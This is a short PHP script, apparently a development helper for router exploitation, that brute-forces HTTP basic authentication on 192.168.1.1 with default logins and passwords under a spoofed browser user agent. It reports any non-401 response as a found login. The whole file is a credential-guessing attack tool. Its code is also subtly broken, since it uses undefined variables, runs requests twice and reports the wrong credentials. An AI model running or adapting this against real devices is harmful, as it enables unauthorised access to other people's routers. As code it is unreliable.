<?php

/**
 * This is just for faster exploit development.
 */

define("CLI_DEBUG", true); //Dont save the results

include("index.php");

$curlFork = new CurlFork();
$ipAdress = "192.168.1.1";

$execTime = microtime(true);

//HTTP Bruteforce
$logins = array("admin", "1234");
$passwords = array("", "admin", "1234");
foreach($logins as $login){
	foreach($passwords as $password){
		echoCli("Trying to login with: ".$login.":".$password, "notice");
		$ch = curl_init($host);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405');
		if($username || $password)
			curl_setopt($ch, CURLOPT_USERPWD, $login . ":" . $password);
		curl_setopt($ch, CURLOPT_NOBODY, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
		curl_exec($ch);
		$curlFork->add($ch);
	}
}
$outputs = $curlFork->run();
if(count($outputs)){
	foreach($outputs as $output){
		if($output["code"]!=401){
			echoCli("Login found! ".$login.":".$password, "success");
			break;
		}
	}
}

echoCli("Time: ".(microtime(true)-$execTime)."ms", "notice");

?>